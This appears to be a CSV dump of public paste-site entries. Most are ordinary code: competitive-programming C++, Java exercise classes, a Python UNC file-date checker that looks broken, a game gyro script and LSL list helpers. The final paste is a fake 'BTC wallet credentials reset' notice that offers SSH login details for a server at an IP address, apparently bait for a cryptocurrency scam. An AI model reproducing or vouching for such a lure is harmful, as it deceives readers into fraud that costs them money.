id,title,username,language,date,content
bCTePkVX,Untitled,Josif_tepe,C++,Tuesday 14th of November 2023 12:00:23 PM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
using namespace std;
const int maxn = 105;
const int INF = 1e8;
int n, k;
int dp[maxn][1101];
int kg[maxn];
int rek(int friends, int left) {
    if(friends == 0 and left > 0) {
        return INF;
    }
    if(left == 0) {
        return 0;
    }
    if(dp[friends][left] != -1) {
        return dp[friends][left];
    }
    int res = INF;
    for(int i = 0; i < n; i++) {
        if(kg[i] != -1) {
            if(left - (i + 1) >= 0) {
                res = min(res, rek(friends - 1, left - (i + 1)) + kg[i]);
            }
        }
    }
    return dp[friends][left] = res;
}
int main()
{
    int t;
    cin >> t;
    
    while(t--) {
        cin >> k >> n;
        for(int i = 0; i < n; i++) {
            cin >> kg[i];
        }
        for(int i = 0; i <= k; i++) {
            for(int j = 0; j <= 1005; j++) {
                dp[i][j] = -1;
            }
        }
        int res = rek(k, n);
        if(res >= INF) {
            cout << -1 << endl;
        }
        else {
            cout << res << endl;
        }
    }
    return 0;
}
"
TSEETj2p,Exercicio class Notas,hercioneto,Java,Tuesday 14th of November 2023 11:42:34 AM CDT,"public class Notas {
    private Float nota1,nota2,nota3,media;

    public Float getNota1() {
        return nota1;
    }

    public void setNota1(Float nota1) {
        this.nota1 = nota1;
    }

    public Float getNota2() {
        return nota2;
    }

    public void setNota2(Float nota2) {
        this.nota2 = nota2;
    }

    public Float getNota3() {
        return nota3;
    }

    public void setNota3(Float nota3) {
        this.nota3 = nota3;
    }

    public Float getMedia() {
        return media;
    }

    public void setMedia() {
        this.media = (this.nota1+this.nota2+this.nota3)/3;
    }
    
    public void lerNotas(){
        Scanner ler = new Scanner(System.in);
        
        System.out.println(""Digite a nota 1: "");
        this.setNota1(ler.nextFloat());
        System.out.println(""Digite a nota 2: "");
        this.setNota2(ler.nextFloat());
        System.out.println(""Digite a nota 3: "");
        this.setNota3(ler.nextFloat());
        this.setMedia();
    }
    
    public void imprimir(){
        System.out.println(""A média do aluno é: ""+ this.getMedia());
    }
    
    
}"
8Fc7iZeJ,Exercicio Class Salarios,hercioneto,Java,Tuesday 14th of November 2023 11:42:01 AM CDT,"public class Salarios {
    private Float valorSalario, valorSalarioUsuario, qtd;

    public Float getValorSalario() {
        return valorSalario;
    }

    public void setValorSalario(Float valorSalario) {
        this.valorSalario = valorSalario;
    }

    public Float getValorSalarioUsuario() {
        return valorSalarioUsuario;
    }

    public void setValorSalarioUsuario(Float valorSalarioUsuario) {
        this.valorSalarioUsuario = valorSalarioUsuario;
    }

    public Float getQtd() {
        return qtd;
    }

    public void setQtd() {
        this.qtd = this.getValorSalarioUsuario()/this.getValorSalario();
    }
    
    public void leituraDados(){
        Scanner ler = new Scanner(System.in);
        
        System.out.println(""Digite o valor do salário mínimo: "");
        this.setValorSalario(ler.nextFloat());
        System.out.println(""Digite o valor do salário mínimo da pessoa: "");
        this.setValorSalarioUsuario(ler.nextFloat());
        this.setQtd();
    }
    public void imprimir(){
        System.out.println(""A pessoa ganha o equivalente a "" + this.getQtd() +"" salários mínimos."");
    }
    
    
}"
EEQYWV00,Exercício Class Valores,hercioneto,Java,Tuesday 14th of November 2023 11:41:11 AM CDT,"public class Valores {
    private Integer valorA,valorB,valorC,soma;

    public Integer getValorA() {
        return valorA;
    }

    public void setValorA(Integer valorA) {
        this.valorA = valorA;
    }

    public Integer getValorB() {
        return valorB;
    }

    public void setValorB(Integer valorB) {
        this.valorB = valorB;
    }

    public Integer getValorC() {
        return valorC;
    }

    public void setValorC(Integer valorC) {
        this.valorC = valorC;
    }

    public Integer getSoma() {
        return soma;
    }

    public void setSoma() {
        this.soma = this.valorA+this.valorB;
    }
    
    public void verificar(){
        if (this.soma<this.valorC){
            System.out.println(""Valor da soma é menor que C"");
        } else {
            System.out.println(""Valor da soma é maior que C"");
        }
    }
    
    
}"
ufG4kwBz,modifieddatev1,G0nz0uk,Python,Tuesday 14th of November 2023 11:36:41 AM CDT,"import os
import socket
import ctypes
from ctypes import wintypes

def get_unc_credentials(remote_path):
    # Get the username and password for the UNC path
    username = input(""Enter the username: "")
    password = input(""Enter the password: "")
    return username, password

def remote_check_modified_date(remote_path):
    try:
        # Check if the path is a UNC path (starts with \\)
        if remote_path.startswith('\\\\'):
            # Split the UNC path into server and share
            server, share, path = remote_path[2:].split('\\', 2)
            
            # Check if the server is reachable
            if socket.gethostbyname(server):
                # Construct the full UNC path
                full_unc_path = f'\\\\{server}\\{share}\\{path}'

                # Get credentials for the UNC path
                username, password = get_unc_credentials(full_unc_path)

                # Use the Windows API to authenticate with the remote server
                net_use_info = wintypes.NETRESOURCE()
                net_use_info.lpRemoteName = full_unc_path
                net_use_info.dwType = 0
                net_use_info.lpLocalName = None
                net_use_info.lpProvider = None

                result = ctypes.windll.mpr.WNetAddConnection2W(
                    ctypes.byref(net_use_info),
                    password.encode('utf-16le'),
                    username.encode('utf-16le'),
                    0
                )

                if result == 0:  # Success
                    # Get the file information
                    file_stat = os.stat(full_unc_path)
                    
                    # Get the modified time from the file information
                    modified_time = file_stat.st_mtime
                    
                    print(f""Modified date of {remote_path}: {modified_time}"")

                    # Disconnect from the remote server
                    ctypes.windll.mpr.WNetCancelConnection2W(full_unc_path, 0, 1)

                else:
                    print(f""Error: Unable to connect to {full_unc_path}, error code: {result}"")

            else:
                print(f""Error: Server {server} not reachable"")

        else:
            print(""Error: Not a valid UNC path"")

    except Exception as e:
        print(f""Error: {e}"")

# Example usage
remote_check_modified_date('\\\\remote_host\\share\\path\\to\\file.txt')
"
8Et15VLP,Untitled,Josif_tepe,C++,Tuesday 14th of November 2023 11:36:41 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
using namespace std;
const int maxn = 2002;
const int INF = 1e9;
vector<pair<int, int> > graph[maxn];
int n;
int dp[maxn][4100];
int rek(int at, int number) {
    if(at >= n) {
        return 0;
    }
    if(dp[at][number] != -1) {
        return dp[at][number];
    }
    int res = INF;
    int idx = (int) (lower_bound(graph[at].begin(), graph[at].end(), make_pair(number, 0)) - graph[at].begin());
    
    if(idx >= 0 and idx < graph[at].size()) {
        for(int i = idx; i < (int) graph[at].size(); i++) {
            int nxt_number = graph[at][i].first;
            int swaps = graph[at][i].second;
            res = min(res, rek(at + 1, nxt_number) + swaps);
        }
    }
    return dp[at][number] = res;
}
int main()
{
  
    cin >> n;
    vector<int> v(n);
    
    for(int i = 0; i < n; i++) {
        cin >> v[i];
    }
    for(int i = 0; i < n; i++) {
        for(int j = 0; j <= 4095; j++) {
            dp[i][j] = -1;
            if(__builtin_popcount(j) == __builtin_popcount(v[i])) {
                int swaps = __builtin_popcount(v[i] ^ j) / 2;
                graph[i].push_back(make_pair(j, swaps));
            }
        }
    }
    
    cout << rek(0, 0) << endl;
    return 0;
}
"
jML1D7gK,GyroECU5,klassekatze,C#,Tuesday 14th of November 2023 11:33:24 AM CDT,"using Sandbox.ModAPI.Ingame;
using System;
using System.Collections.Generic;
using System.Data.Common;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using VRageMath;

namespace IngameScript
{
	partial class Program : MyGridProgram
	{
		public class GyroECU5
		{
			public static double gyroMaxRPM = Math.PI;

			public double angleMultiplier = 1;

			public GyroECU5() : base()
			{
				angleMultiplier = gProgram.Me.CubeGrid.GridSizeEnum == VRage.Game.MyCubeSize.Small ? 2 : 1;
				gyroMaxRPM *= angleMultiplier;
				lastAngleRoll = lastAnglePitch = lastAngleYaw = 0;
				lMPTRoll = lMPTPitch = lMPTYaw = 0;
			}
			double lastAngleRoll, lastAnglePitch, lastAngleYaw;
			double lMPTRoll, lMPTPitch, lMPTYaw;

			public bool active = false;
			Vector3D targetPosition;
			Vector3D targetVelocity;//currently unused

			Vector3D targetHeading;
			Vector3D targetUp;

			public int startTick;
			public int ticksOnTarget = 0;
			private void flush()
			{
				if (!active)
				{
					active = true;
					foreach (var g in gyros) g.GyroOverride = false;
					lG = null;
					startTick = tick;
					lastAngleRoll = lastAnglePitch = lastAngleYaw = 0;
					lMPTRoll = lMPTPitch = lMPTYaw = 0;
					ticksOnTarget = 0;
				}
			}

			public void rotateToPosition(Vector3D tp, Vector3D tv = new Vector3D())
			{
				if (!active) log(""GECU test init rtp"", LT.LOG_N);
				flush();
				targetPosition = tp;
				targetVelocity = tv;
				targetUp = getCtrl().WorldMatrix.Up;
			}
			public void rotateToHeading(Vector3D forward, Vector3D up = new Vector3D())
			{
				if (up == Vector3D.Zero) up = getCtrl().WorldMatrix.Up;
				if (!active)
				{
					log(""GECU test init rth"", LT.LOG_N);
					log(""forward:"" + v2ss(forward), LT.LOG_N);
					log(""up:"" + v2ss(up), LT.LOG_N);
				}
				flush();
				targetPosition = targetVelocity = Vector3D.Zero;
				targetHeading = forward;
				targetUp = up;
			}

			double error_thresholdLocked = ConvertDegreesToRadians(1);//we must be within this much on each axis
			double minVelThresholdLocked = ConvertDegreesToRadians(1d);
			//these only set qualifiers for ticksOnTarget.
			
			private void calculateAxisSpecificData(double now, ref double prior, ref double lastMPT, out bool braking, out double lastMPTActual, string p = """")//, out double ticksToStop, out double ticksToTarget)
			{

				var radMovedPerTick = Math.Abs(prior - now);
				var ticksToTarget = Math.Abs(now) / radMovedPerTick;
				var initVel = radMovedPerTick;
				var rateOfDecel = Math.Abs(lastMPT - radMovedPerTick);
				//if (rateOfDecel > mod) mod = rateOfDecel;

				//if (Math.Abs(now) > nobrake_threshold) rateOfDecel *= 1.5;//overestimating here did not improve timings
				var ticksToStop = initVel / rateOfDecel;
				//mod - maximum observed decel - saved 0.1s on large sluggish ship but lost .3s on sg snappy ship.
				//sticking to the conservative metric

				bool closing = Math.Abs(now) < Math.Abs(prior);
				lastMPTActual = radMovedPerTick;
				if (!closing)
				{
					lastMPT = 0.0001;
				}
				else lastMPT = radMovedPerTick;

				if (closing)
				{
					if (ticksToStop > ticksToTarget + 1) braking = true;
					else braking = false;
				}
				else braking = false;
				
				prior = now;
			}

			//for distances under 90 degrees, it returns a value between 0 and gyromaxRPM, sharpened with sine so it levels off a bit in a nice way at the end.
			//slightly black magic, but if it works, it works
			static double amp_threshold = ConvertDegreesToRadians(100);//125.0d);
			static double deAmp(double i)//, double spd)
			{
				if (i == 0) return i;
				var abs = Math.Abs(i);
				var ig = i / abs * gyroMaxRPM;
				//spd = 0;
				if (abs > amp_threshold) return ig;
				
				i = i / (amp_threshold);
				i = Math.Abs(i);
				i = Math.Sin(i);
				return i * ig;
			}

			public static void setUpdateRate(int ups)
			{
				updateRate = ups;
				updr_mult = 60 / updateRate;
				updr_mult_div = updr_mult / 60.0d;
			}

			static int updateRate = 60;
			static int updr_mult = 60 / updateRate;
			static double updr_mult_div = 60.0d / updateRate / 60.0d;
			int ltick = -1;
			public void update()
			{

				if (active && tick - ltick > updr_mult)// && tick % 2 == 0)
				{
					ltick = tick;

					if (!targetPosition.IsZero()) targetHeading = Vector3D.Normalize(targetPosition - getPosition());

					double pitch, yaw, roll;
					GetRotationAnglesSimultaneous(targetHeading, targetUp, getCtrl().WorldMatrix, out yaw, out pitch, out roll);

					double rA, pA, yA;

					bool yB, pB, rB;
					calculateAxisSpecificData(roll, ref lastAngleRoll, ref lMPTRoll, out rB, out rA);
					calculateAxisSpecificData(pitch, ref lastAnglePitch, ref lMPTPitch, out pB, out pA);
					calculateAxisSpecificData(yaw, ref lastAngleYaw, ref lMPTYaw, out yB, out yA);

					//Vector3D a_act = new Vector3D(pA, yA,rA);
					//var amax = a_act.AbsMax();
					
					Vector3D a_impulse = new Vector3D(pB ? 0 : pitch, yB ? 0 : yaw, rB ? 0 : roll);

					//black magic everywhere
					a_impulse.X = deAmp(a_impulse.X);//, amax * updr_mult);
					a_impulse.Y = deAmp(a_impulse.Y);//, amax * updr_mult);
					a_impulse.Z = deAmp(a_impulse.Z);//, amax * updr_mult);
					if (Math.Abs(pA) / 60* updateRate > Math.Abs(a_impulse.X)) a_impulse.X = 0;
					if (Math.Abs(yA) / 60 * updateRate > Math.Abs(a_impulse.Y)) a_impulse.Y = 0;
					if (Math.Abs(rA) / 60 * updateRate > Math.Abs(a_impulse.Z)) a_impulse.Z = 0;


					GyroOverride(getCtrl().WorldMatrix, a_impulse.X, a_impulse.Y, a_impulse.Z);

					if (Math.Abs(roll) < error_thresholdLocked && Math.Abs(pitch) < error_thresholdLocked && Math.Abs(yaw) < error_thresholdLocked)
					{
						if (rA < minVelThresholdLocked * updr_mult_div && pA < minVelThresholdLocked * updr_mult_div && yA < minVelThresholdLocked * updr_mult_div)
						{
							ticksOnTarget += 1;
						}
						else ticksOnTarget = 0;
					}
					else ticksOnTarget = 0;
				}
			}

			IMyGyro lG = null;
			static Vector3D state = new Vector3D(9, 9, 9);
			const double E = MathHelper.EPSILON;
			void GyroOverride(MatrixD shipRef, double pitch_speed, double yaw_speed, double roll_speed)
			{
				IMyGyro g = null;
				foreach(var c in gyros)
				{
					if(c.Enabled && c.IsFunctional && !c.Closed)
					{
						g = c;
						break;
					}
				}
				if (g == null) return;

				if(g != lG)
				{
					lG = g;
					state = new Vector3D(9, 9, 9);
					g.GyroOverride = true;
				}

				var rotationVec = new Vector3D(-pitch_speed, yaw_speed, roll_speed); //because keen does some weird stuff with signs 
				var relativeRotationVec = Vector3D.TransformNormal(rotationVec, shipRef);
				var trv = Vector3D.TransformNormal(relativeRotationVec, Matrix.Transpose(g.WorldMatrix));
				
				if (trv.X != state.X)// && Math.Abs(trv.X - state.X) > E)
				{
					state.X = trv.X;
					g.Pitch = (float)(state.X);
				}
				if (trv.Y != state.Y)// && Math.Abs(trv.Y - state.Y) > E)
				{
					state.Y = trv.Y;
					g.Yaw = (float)(state.Y);
				}
				if (trv.Z != state.Z)// && Math.Abs(trv.Z - state.Z) > E)
				{
					state.Z = trv.Z;
					g.Roll = (float)(state.Z);
				}
			}

			public void shutdown()
			{
				if (active)
				{
					active = false;
					if(lG != null)lG.GyroOverride = false;
					log(""GECU shutdown"", LT.LOG_N);
					log(""time: "" + (tick - startTick) + ""t ("" + ((double)(tick - startTick) / 60).ToString(""0.0"") + ""s)"", LT.LOG_N);
				}
			}
		}
	}
}"
aGgfZRzZ,Untitled,Madi_Perth,Linden Scripting,Tuesday 14th of November 2023 11:32:40 AM CDT,"/*
This file contains a series of defines and functions that will
allow you to use linkSetData memory for lists.  These lists will
not have all the versitlity of normal LSL lists.

The format in LinksetData memory are as follows.

The first entry in a list is the master header file.  It is 
defined as the following.

linkset listName is the list listName and the data is the number of
entries the list.

<listName> -> <list entries number>

the format of each list entry is as follows

<listName>:<entrynumber>:<data>

*/

// The first step is the define the linkSetList entry
integer linkSetDefine(string listName)
{
    // test to see if entry already exists, 
    // if so return error of -1
    if(llLinksetDataRead(listName) != """")
        return -1;
    else 
        llLinksetDataWrite(listName, ""0"");
    return 1; // linkSetList Created.
}

// add a entry to the linkset entry and increment the 
// the count by one when adding.   create the linkSet 
// if it does not exist. any data other than a string
// must be typecast to a string.
integer addLinkData(string listName, string data)
{
    integer tcList;
    // if listName exists, add link
    // and increment count.
    if(linkSetDefine(listName) == 1)
        tcList = incrmLinkCount(listName, 0);
    else
        tcList = incrmLinkCount(listName, 1);
    llLinksetDataWrite(listName +"":""+ (string) tcList +"":""+data, ""0"");    

    return tcList;
}

// get count total from base and increase it by 'count'
integer incrmLinkCount(string listName, integer count)
{
    integer currentNum = (integer) llLinksetDataRead(listName);
    
    currentNum += count;
    llLinksetDataWrite(listName, (string) currentNum);

    return currentNum;
}

// Return the number of entries in a linkSetList
integer GetLinkSetListLength(string listName)
{
    // return error if linkSetList does not exits of -1 
    integer listLength = (integer) llLinksetDataRead(listName);
    if(listLength == 0)
        return -1;
    else
        return (listLength + 1);
}

// returns a string that is at index in src
string linkList2String(string src, integer index)
{
    string found;
    string searchFor = src+"":""+(string) index +"":"";

    found = (string) llLinksetDataFindKeys(searchFor, 0, 1);
    return llList2String(llParseString2List(found, ["":""], [""""]), 2);
}
"
N2asENCG,Untitled,Josif_tepe,C++,Tuesday 14th of November 2023 11:31:37 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
using namespace std;
const int maxn = 2002;
const int INF = 1e9;
vector<pair<int, int> > graph[maxn];
int n;
int dp[maxn][4100];
int rek(int at, int number) {
    if(at >= n) {
        return 0;
    }
    if(dp[at][number] != -1) {
        return dp[at][number];
    }
    int res = INF;
    for(int i = 0; i < (int) graph[at].size(); i++) {
        int nxt_number = graph[at][i].first;
        int swaps = graph[at][i].second;
        
        if(number <= nxt_number) {
            res = min(res, rek(at + 1, nxt_number) + swaps);
        }
    }
    return dp[at][number] = res;
}
int main()
{
  
    cin >> n;
    vector<int> v(n);
    
    for(int i = 0; i < n; i++) {
        cin >> v[i];
    }
    for(int i = 0; i < n; i++) {
        for(int j = 0; j <= 4095; j++) {
            dp[i][j] = -1;
            if(__builtin_popcount(j) == __builtin_popcount(v[i])) {
                int swaps = __builtin_popcount(v[i] ^ j) / 2;
                graph[i].push_back(make_pair(j, swaps));
            }
        }
    }
    
    cout << rek(0, 0) << endl;
    return 0;
}
"
SMXu1kUs,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Tuesday 14th of November 2023 11:21:29 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT677173"
